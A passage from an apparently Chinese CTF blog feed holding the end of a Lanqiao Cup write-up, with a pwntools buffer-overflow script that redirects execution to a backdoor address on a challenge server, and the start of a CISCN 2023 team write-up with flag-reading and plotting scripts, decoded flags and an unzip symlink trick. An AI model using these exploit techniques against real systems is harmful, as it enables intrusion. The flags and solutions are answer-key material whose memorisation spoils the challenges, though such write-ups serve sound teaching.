operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># p = process('./pwn')</span><span class="token comment"># libc = ELF('../../glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.200.77.68'</span><span class="token punctuation">,</span> <span class="token string">'12451'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('./libc-2.27.so')</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> num <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011B1</span>payload <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="杂谈："><a href="#杂谈：" class="headerlink" title="杂谈："></a>杂谈：</h2><blockquote><p>以下为个人观点</p></blockquote><p>今年的蓝桥杯可以说是破事一堆，作为网安这边第一个交钱比赛的赛事，第一个双机位监考同时设有监考老师，禁止查外网，甚至禁止pip的比赛，今年的蓝桥杯网安都有开创性的意义</p><p>如果我没记错的话，第一次定的时间是5月27-28，然后果不其然跟CISCN撞了，之后改时间啥啥的作为一个看乐子的人倒是看了个尽兴，同时今年一些高校，在与蓝桥杯合作的高校在没有接触过CTF的同学们中宣传本届蓝桥杯网络安全大赛…….</p><p>最后的结果已经是省赛能做一道题就能稳定三等奖了，团队中全栈大佬甚至在比赛中短暂登顶初赛第一，最后前五十，因为蓝桥杯在算法那边的名声在外还真有一些没接触过CTF的兄弟报名了蓝桥杯网络安全大赛，最后0解饮恨</p><p>只能说不好评价也不想评价，蓝桥杯赛事主办方你开心就好</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝桥杯 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年ciscn题解</title>
      <link href="/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="DebuGGerrr-战队WRITEUP"><a href="#DebuGGerrr-战队WRITEUP" class="headerlink" title="DebuGGerrr 战队WRITEUP"></a>DebuGGerrr 战队WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称： DebuGGerrr </p><p>战队排名：261</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528173741.png">  </p><p>[TOC]</p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><h4 id="签到卡："><a href="#签到卡：" class="headerlink" title="签到卡："></a>签到卡：</h4><p> 随便输入得到hint，关注公众号，得到他的提示，输入 print(open(‘/flag’).read())得到flag</p><h4 id="国粹："><a href="#国粹：" class="headerlink" title="国粹："></a>国粹：</h4><p>在最初的思路里是一位题目是一个形如E(x)=(ax+b)(modm)的类仿射密码</p><p>后面试着要不把这些画出来看下，在写了几串之后看到了flag….然后因为分工，两个人写点坐标的格式不一样，最终Python代码如下…..</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment">#读入文件</span>file_path <span class="token operator">=</span> <span class="token string">"data.txt"</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> header<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#定义 x  y变量</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#定义颜色变量</span>color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">]</span>xx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">]</span>yy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token comment">#用for循环将文件中的值赋值给x，y</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#画图</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span>color<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/Ciscn%20%E6%95%A3%E7%82%B9%E5%9B%BE.png" style="zoom:67%;" /><blockquote><p> flag{202305012359}</p></blockquote><h4 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量:"></a>被加密的生产流量:</h4><p>追踪流发现base编码</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230527141401.png" style="zoom: 33%;" /><p>base32编码，解码得到flag</p><blockquote><p>flag{c1f_fi1g_1000}</p></blockquote><h4 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell:"></a>pyshell:</h4><p>本题为python的shell终端，拼接读取flag的字符串后用eval()进行执行，即可获得flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145149.png" style="zoom: 67%;" /><blockquote><p>flag{2c9b76d6-8379-4dd8-a95a-a383420575f5}</p></blockquote><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="unzip："><a href="#unzip：" class="headerlink" title="unzip："></a>unzip：</h4><p>建立软连接实现，</p><p>参考博客：<code>https://forum.butian.net/share/906</code></p><p>先建立软连接</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F;var&#x2F;www&#x2F;html test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers 